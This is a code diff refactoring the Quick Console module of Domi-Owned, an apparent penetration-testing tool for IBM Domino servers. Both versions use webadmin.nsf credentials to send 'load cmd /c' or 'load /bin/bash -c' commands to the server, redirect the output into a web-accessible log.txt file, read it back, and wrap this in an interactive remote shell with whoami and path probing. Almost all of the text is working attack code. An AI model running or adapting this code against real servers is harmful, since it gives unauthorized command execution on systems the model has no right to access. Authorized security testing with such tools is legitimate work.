@@ -1,4 +1,4 @@
-# Copyright (c) 2016, Brandan Geise [coldfusion]
+# Copyright (c) 2017, Brandan Geise [coldfusion]
 #
 # Permission is hereby granted, free of charge, to any person obtaining a copy
 # of this software and associated documentation files (the "Software"), to deal
@@ -18,198 +18,192 @@
 # OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
 # SOFTWARE.
 import cmd
+import hashlib
 import re
 import requests
+import sys
 
-from domi_owned import utility
-
-try:
-	requests.packages.urllib3.disable_warnings()
-except:
-	pass
+from .main import DomiOwned
+from .utilities import Utilities
 
 
-# Interact with Domino Quick Console through web requests
-class Interactive(cmd.Cmd, object):
-	def __init__(self, target, os, path, username, password, user, hostname, session):
-		cmd.Cmd.__init__(self)
-		self.target = target
-		self.os = os
-		self.path = path
-		self.username = username
-		self.password = password
-		self.user = user
-		self.hostname = hostname
-		self.session = session
-		if os == 'windows':
-			self.prompt = 'C:\Windows\System32>'
+class QuickConsole(DomiOwned):
+
+	def quickconsole(self):
+		"""
+		Interact with Domino Quick Console through web requests.
+		"""
+		# Check if the user can access webadmin.nsf
+		if self.check_access(self.username, self.password)['webadmin.nsf']:
+
+			if self.auth_type == 'basic':
+				self.session.auth = (self.username, self.password)
+
+			# Get information about Quick Console instance
+			info = self.get_info()
+			if None not in info.values():
+				self.logger.info("Running as {0}".format(info['user']))
+
+				# Start interacting with the Domino Quick Console
+				Interact(self.logger, self.session, self.url, info).cmdloop()
+			else:
+				self.logger.warn('Domino Quick Console is not active')
 		else:
-			self.prompt = "{0}@{1}:/local/notesdata$ ".format(user, hostname)
+			self.logger.error("Unable to access {0}/webadmin.nsf, bad username or password".format(self.url))
+
+	def get_info(self):
+		"""
+		Get OS, install path, hostname, and account the Domino server is running as.
+		"""
+		info = {
+			'url': self.url,
+			'os': None,
+			'path': None,
+			'user': None,
+			'hostname': None
+		}
+
+		try:
+			response = self.session.get("{0}/webadmin.nsf/fmpgHomepage?ReadForm".format(self.url))
+		except (requests.exceptions.RequestException, requests.exceptions.ReadTimeoutError) as error:
+			self.logger.error('Request timeout, the Domino server has stopped responding')
+			sys.exit()
+
+		# Linux Domino server
+		if 'UNIX' in response.text:
+			info['os'] = 'linux'
+			user_regex = self.utilities.LINUX_USER_REGEX
+			user_command = 'echo $HOSTNAME:$USER'
+			command_template = "load /bin/bash -c \"{command} > {path}/domino/html/download/filesets/log.txt\""
+
+			domino_paths = [
+				'/local/notesdata'                                       # 9.0.1 Ubuntu x32
+			]
+
+		# Windows Domino server
+		else:
+			info['os'] = 'windows'
+			user_regex = self.utilities.WINDOWS_USER_REGEX
+			user_command = 'whoami'
+			command_template = "load cmd /c {command} > \"{path}\\domino\\html\\download\\filesets\\log.txt\""
+
+			domino_paths = [
+				'C:\\Program Files\\IBM\\Domino\\data',                  # 9.0.1 Windows x64
+				'C:\\Program Files\\IBM\\Lotus\\Domino\\data',           # 8.5.3 Windows x64
+				'C:\\Program Files (x86)\\IBM\\Domino\\data',            # 9.0.1 Windows x86
+				'C:\\Program Files (x86)\\IBM\\Lotus\\Domino\\data',     # 8.5.3 Windows x86
+				'C:\\Lotus\\Domino\\data'                                # Unknown
+			]
+
+		# Get local file path
+		if self.utilities.PATH_REGEX.search(response.text):
+			path = self.utilities.PATH_REGEX.search(response.text).group(1)
+			if path.replace('\\\\', '\\') not in domino_paths:
+				domino_paths.insert(0, path.replace('\\\\', '\\'))
+
+		# Get Domino install path
+		for domino_path in domino_paths:
+			path_id = hashlib.md5(domino_path.encode('utf-8')).hexdigest()
+			command = command_template.format(command="echo {0}".format(path_id), path=domino_path)
+			response = self.send_command(command)
+			if path_id in response.text:
+				info['path'] = domino_path
+				break
+
+		# Get user and hostname
+		command = command_template.format(command=user_command, path=domino_path)
+		response = self.send_command(command)
+		if user_regex.search(response.text):
+			info['hostname'], info['user'] = user_regex.search(response.text.rstrip()).group(1, 2)
+
+		return info
+
+	def send_command(self, command):
+		"""
+		Send a command to the Domino Quick Console.
+		"""
+		try:
+			response = self.session.get("{0}/webadmin.nsf/agReadConsoleData$UserL2?OpenAgent&Mode=QuickConsole&Command={1}&1446773019134".format(self.url, command))
+			if 'Command has been executed' in response.text:
+				return self.session.get("{0}/download/filesets/log.txt".format(self.url))
+			else:
+				self.logger.error('Failed to execute command using the Quick Console')
+				sys.exit()
+
+		except (requests.exceptions.RequestException, requests.exceptions.ReadTimeoutError) as error:
+			self.logger.error('Request timeout, the Domino server has stopped responding')
+			sys.exit()
+
+
+class Interact(cmd.Cmd):
+	"""
+	Drop into interactive Quick Console session.
+	"""
+	def __init__(self, logger, session, url, info):
+		cmd.Cmd.__init__(self)
+		self.utilities = Utilities()
+		self.logger = logger
+		self.session = session
+		self.url = url
+
+		if info['os'] == 'windows':
+			self.del_command = 'del'
+			self.prompt = "{0}:\\Windows\\System32>".format(info['path'].split(':')[0])
+			self.command_template = "load cmd /c {command} {operator}\"" + "{0}\\domino\\html\\download\\filesets\\log.txt\"".format(info['path'])
+		else:
+			self.del_command = 'rm'
+			self.prompt = "{0}@{1}:/local/notesdata$ ".format(info['user'], info['hostname'])
+			self.command_template = "load /bin/bash -c \"{command} {operator}" + "{0}/domino/html/download/filesets/log.txt\"".format(info['path'])
 
 	def emptyline(self):
 		pass
 
 	def default(self, line):
-		operator = '> '
-		self.quick_console(line, operator, self.target, self.os, self.path, self.username, self.password, self.session)
+		self.console(line)
 
-	# Handle Domino Quick Console
-	def quick_console(self, command, operator, target, os, path, username, password, session):
-		if session is None:
-			session = requests.Session()
-			session.auth = (username, password)
-
-		if os == 'windows':
-			raw_command = "load cmd /c {0} {1}\"{2}\domino\html\download\\filesets\log.txt\"".format(command, operator, path)
+	def console(self, command, operator='> '):
+		response = self.send(self.command_template.format(command=command, operator=operator))
+		if response is None:
+			self.logger.error('Command is too long')
+		elif response is False:
+			self.logger.error('Failed to execute command using the Quick Console')
+		elif response.status_code == 200 and '>' in operator:
+			print(response.text)
+		elif response.status_code == 200 and '>' not in operator:
+			self.logger.error('Unable to delete outfile')
+		elif response.status_code == 404 and '>' not in operator:
+			self.logger.info('Outfile successfully deleted')
 		else:
-			raw_command = "load /bin/bash -c \"{0} {1}{2}/domino/html/download/filesets/log.txt\"".format(command, operator, path)
+			self.logger.error('Outfile not found')
+			self.do_exit
 
+	def send(self, command):
+		"""
+		Send a command to the Domino Quick Console.
+		"""
 		# Quick Console commands must be less than 255 characters
-		if len(raw_command) > 255:
-			utility.print_warn('Issued command is too long')
+		if len(command) > 255:
+			return None
 		else:
-			quick_console_url = "{0}/webadmin.nsf/agReadConsoleData$UserL2?OpenAgent&Mode=QuickConsole&Command={1}&1446773019134".format(target, raw_command)
-			response_url = "{0}/download/filesets/log.txt".format(target)
-
-			# Send commands and handle cleanup
-			send_command = session.get(quick_console_url, headers=utility.get_headers(), verify=False)
-			if send_command.status_code == 200:
-				get_response = session.get(response_url, headers=utility.get_headers(), verify=False)
-				if get_response.status_code == 200 and '>' in operator:
-					print(get_response.text)
-				elif get_response.status_code == 200 and '>' not in operator:
-					utility.print_warn('Unable to delete outfile')
-				elif get_response.status_code == 404 and '>' not in operator:
-					utility.print_good('Outfile sucessfully deleted')
+			try:
+				response = self.session.get("{0}/webadmin.nsf/agReadConsoleData$UserL2?OpenAgent&Mode=QuickConsole&Command={1}&1446773019134".format(self.url, command))
+				if 'Command has been executed' in response.text:
+					return self.session.get("{0}/download/filesets/log.txt".format(self.url))
 				else:
-					utility.print_warn('Outfile not found')
-					do_exit
-			else:
-				utility.print_warn('Quick Console is unavaliable')
-				do_exit
+					return False
+
+			except (requests.exceptions.RequestException, requests.exceptions.ReadTimeoutError) as error:
+				self.logger.error('Request timeout, the Domino server has stopped responding')
+				self.do_exit
 
 	def do_EOF(self, line):
 		operator = ''
-		if self.os == 'windows':
-			command = 'del'
-		else:
-			command = 'rm'
+		self.console(self.del_command, operator=operator)
 
-		self.quick_console(command, operator, self.target, self.os, self.path, self.username, self.password, self.session)
 		return True
 
 	def help_EOF(self):
-		print('Type exit to quit')
+		self.logger.debug('Type exit to quit')
 
 	do_exit = do_EOF
 	help_exit = help_EOF
-
-
-# Check if the user has access to webadmin.nsf and get Domino server information
-def check_access(target, username, password, auth):
-	webadmin_url = "{0}/webadmin.nsf".format(target)
-	try:
-		# Check access
-		if auth == 'basic':
-			access = utility.basic_auth(webadmin_url, username, password)
-			session = None
-		elif auth == 'form':
-			access, session = utility.form_auth(webadmin_url, username, password)
-		else:
-			session = None
-
-		# Get local file path
-		path_url = "{0}/webadmin.nsf/fmpgHomepage?ReadForm".format(target)
-		if access or auth == 'open':
-			if auth == 'basic':
-				check_path = requests.get(path_url, headers=utility.get_headers(), auth=(username, password), verify=False)
-			elif auth == 'form':
-				check_path = session.get(path_url, headers=utility.get_headers(), verify=False)
-			else:
-				check_path = requests.get(path_url, headers=utility.get_headers(), verify=False)
-
-			path_regex = re.compile("DataDirectory\s*=\s*'(.+)';", re.I)
-			if path_regex.search(check_path.text):
-				local_path = path_regex.search(check_path.text).group(1)
-			else:
-				local_path = None
-				utility.print_warn('Could not identify Domino file path')
-
-			# Get operating system
-			if 'UNIX' in check_path.text:
-				os = 'linux'
-			elif 'Windows' in check_path.text:
-				os = 'windows'
-			else:
-				os = 'windows'
-				utility.print_warn('Could not identify Domino operating system')
-
-			# Test writing to local file system
-			whoami, path, hostname = test_command(target, os, local_path, username, password, session)
-			if whoami and path:
-				Interactive(target, os, path, username, password, whoami, hostname, session).cmdloop()
-			else:
-				utility.print_warn('Unable to access webadmin.nsf')
-
-		else:
-			utility.print_warn("Unable to access {0}, might not be an admin".format(webadmin_url))
-
-	except Exception as error:
-		utility.print_error("Error: {0}".format(error))
-
-
-# Test outfile redirection
-def test_command(target, os, path, username, password, session):
-	if session is None:
-		session = requests.Session()
-		session.auth = (username, password)
-
-	whoami, local_path, hostname = None, None, None
-
-	# Windows default Domino data paths
-	if os == 'windows':
-		paths = [
-			'C:\Program Files\IBM\Domino\data',                 # 9.0.1 Windows x64
-			'C:\Program Files\IBM\Lotus\Domino\data',           # 8.5.3 Windows x64
-			'C:\Program Files (x86)\IBM\Domino\data',           # 9.0.1 Windows x86
-			'C:\Program Files (x86)\IBM\Lotus\Domino\data',     # 8.5.3 Windows x86
-			'C:\Lotus\Domino\data'                              # Unknown
-		]
-
-	# Linux default Domino data path
-	else:
-		paths = ['/local/notesdata']                            # 9.0.1 Ubuntu x32
-
-	if path and path.replace('\\\\', '\\') not in paths:
-		paths.insert(0, path.replace('\\\\', '\\'))
-
-	for local_path in paths:
-		try:
-			if os == 'windows':
-				raw_command = "load cmd /c whoami > \"{0}\domino\html\download\\filesets\log.txt\"".format(local_path)
-			else:
-				raw_command = "load /bin/bash -c \"echo $USER:$HOSTNAME > {0}/domino/html/download/filesets/log.txt\"".format(local_path)
-
-			quick_console_url = "{0}/webadmin.nsf/agReadConsoleData$UserL2?OpenAgent&Mode=QuickConsole&Command={1}&1446773019134".format(target, raw_command)
-			response_url = "{0}/download/filesets/log.txt".format(target)
-
-			# Do things...
-			send_command = session.get(quick_console_url, headers=utility.get_headers(), verify=False)
-			if send_command.status_code == 200:
-				get_response = session.get(response_url, headers=utility.get_headers(), verify=False)
-				if get_response.status_code == 200:
-					if os == 'windows':
-						user_regex = re.compile('.+\\\\(.+)')
-					else:
-						user_regex = re.compile('([a-z0-9-_].+):(.+)', re.I)
-						hostname = user_regex.search(get_response.text).group(2)
-
-					if user_regex.search(get_response.text).group(1):
-						whoami = user_regex.search(get_response.text).group(1)
-						utility.print_good("Running as {0}".format(whoami))
-						break
-
-		except Exception as error:
-			continue
-
-	return whoami, local_path, hostname
